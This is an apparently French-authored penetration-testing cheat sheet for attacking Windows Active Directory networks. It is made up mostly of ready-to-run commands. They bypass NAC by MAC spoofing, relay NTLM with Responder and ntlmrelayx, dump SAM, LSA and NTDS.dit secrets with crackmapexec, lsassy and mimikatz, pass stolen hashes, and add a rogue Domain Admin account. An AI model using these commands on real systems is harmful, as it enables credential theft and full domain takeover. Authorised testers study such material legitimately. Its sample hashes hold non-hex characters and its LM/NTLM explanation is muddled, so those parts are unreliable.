# TII

## TI \( tta review\)

## Global method

### No network access

#### Wi-Fi

* Crack WPA or crack/replay PEAP

  **NAC - MAC filtering**

* Spoof mac from any autorized device \(printer\) and disconnect it: `macchanger -r eth0`
* force your static IP to match the one that you spoofed the mac from : `sudo ifconfig 10.11.12.13/24` `sudo ip route add default via <gateway_ip>`

#### NAC - 802.1X

* IEEE 802.1X bypass :

  [https://github.com/Orange-Cyberdefense/fenrir-ocd](https://github.com/Orange-Cyberdefense/fenrir-ocd)

### Network access but no account yet

#### Port and service scan

* Search for low hanging fruits \(MS17 / default password TOMCAT VNC ... \)
  * Nessus
  * Nmap

    **Man in the middle**
* LLNMR + NBTNS
  * Responder + NTLMrelayx
* IPv6
  * mitm6 + NTLMrelayx
* ARP \(use with caution !\)
  * Cain \(& Abel\)

    **Domain enum**
* Password policy \(especially lockout threshold for bruteforce\)
  * Enum4Linux
* Open shares \(anonymous SMB, NFS, FTP, etc\)
  * SMBmap

    **Kerberos**
* Pre-Auth TGT
  * Kerbrute \(-debug\)

### Unprivileged account only

#### Domain enum

* Path for escalation

  `bloodhound.py -d <domain> -u <user> -p <password> -ns <IP-DC> -c all`

  **Get more hash**

* SMB restricted shares
  * .ico .scf =&gt; Responder/NTLMrelayx

    **Local admin account \(or physical access\)**

    **Dump secrets**
* dump SAM, LSA

  `crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa`

  * Impacket-secretsdump
  * LSASSY
  * Spraykatz
  * Mimikatz

* dump browser secrets
  * Saved passwords from Firfox/Chrome/Edge...

#### Replay the secrets found

* LM/NTLM hash or cleartext password
  * Crackmapexec \(--sam et --lsa\)

    **Kerberos pivoting**

    1. Find domain admin accounts 
    2. net group "Domain Admins" /DOMAIN
    3. Find which if one is loggedin somewhere : 
    4. crackmapexec \(--loggedin\)
    5. Impersonate his kerberos token
    6. `incongnito` \(meterpreter\)
    7. Create new Domain Admin account 

       ```text
       net user add <user> <pass> /domain
       net group "Domain Admins" <user> /add
       ```

### Domain admin account

* Dump NDTS.dit from DC
  * crackmapexec

## Methodo \(mho\):

* Nmap on 445
* PC trainee \(dump hash, and reply it using cme\)
* SCAN NESSUS \( Looking for MS17 / TOMCAT / VNC / low hanging fruits... \)
* `nmap -T4 -Pn -p 445 --open -oA yolo 192.168.1.0/24`
* `cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt`
* `cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt`

> if the scope is small : `cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt`

When we have list of targets, we edit responder.conf like this :

`nano /usr/share/responder/Responder.conf`

```text
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

After we can run Responder + ntlmrelayx

`python Responder.py -I <interface> -rdw`

`ntlmrelayx.py -tf relaylistOutputFilename.txt`

> This command will generate many log files which contain SAM hashes, just get all these files and store it into a formatted file that include all hashes. `cat *.sam |sort -u > hashs.txt` Then you can just run CrackMapExec on full perim using theses hashs.

`crackmapexec smb perim_up_smb.txt -u Administrator -d '.' -H hash.txt --lsa`

Now we may have cleartext passwords \(maybe domain admin pass ?\)

### Theorical

Hash to use with CrackMapExec : `NTLM / NTLMV2 / LM` Hash to use with Nlmrelayx :`NET-NTLM / NET-NTLMV2`

> LM / NTLM\(v2\) can be used at any time. NET-NTLM\(v2\) are usable for a limited period of time.

#### NTLM

examples : `aad3b435b51404eeaad3b435b51404ee:87247c6499ddef87b7348f262a3e203d` `aad3b435b51404eeaad3b435b51404ee:64247c6499def845dsffg652a3e2052f`

a default NTLM hash will start with :`aad3b435b51404eeaad3b435b51404ee` In other case its an LM hash.

#### LM

examples : `88647c6699ddef87b6748f262b2e203d:89247c6499ddef87b7348f262a3e204d` `12587c6654ddef87b67485sdfb2e203d:64247c6499def845dsffg652a3e2052f`

## Some useful command :

### Gathering

`enum4linux -a <IP>`

`enum4linux -a 192.168.0.1 -u 'USER' -p 'PASSWORD' -d THE_DOMAIN`

### Dump Domain

`python ldapdomaindump.py -u 'THE_DOMAIN\USER' -p 'PASSWORD' 192.168.0.1`

`python bloodhound.py -d <domain> -u <user> -p <password> -ns <IP-DC> -c all`

### Dump LSA

#### with CrackMapExec

`crackmapexec smb perim_up.txt -u 'USER' -d 'THE_DOMAIN' -H '5ded93fb950bd9d9f3d984b9f16f:4f9b18c4211a83524063814b5462d560' --lsa`

#### With lsassy

`lsassy -d '.' -u 'Administrateur' -H 'aad3b435b51404eeaad3b4304baf33fa249726c' <ip>`

`lsassy -d <domain> -u <user> -p <pass> <ip>`

#### SprayKatz

`./spraykatz.py -u <user> -p <password> -t <ip>`

### Shares

Show content of folder :

`smbmap -H 192.168.0.1 -u <user> -p <password> -d <domain> -r <path>`

Download file :

`smbmap -H 192.168.0.1 -u 'USER' -p 'PASSWORD' --download <path>`

`smbclient -L ///192.168.0.1 -U <user> -c ls`

### Get DC IP :

`cat /etc/resolv.conf`

### NAC

* piquer la MAC d'un autre appareil 

> si ça passe pas essayer de forcer l'ip

`sudo ifconfig 10.11.12.13/24` `sudo ip route add default via <GAEWAY>`

last solution : IEEE 802.1X bypass : [https://github.com/Orange-Cyberdefense/fenrir-ocd](https://github.com/Orange-Cyberdefense/fenrir-ocd)

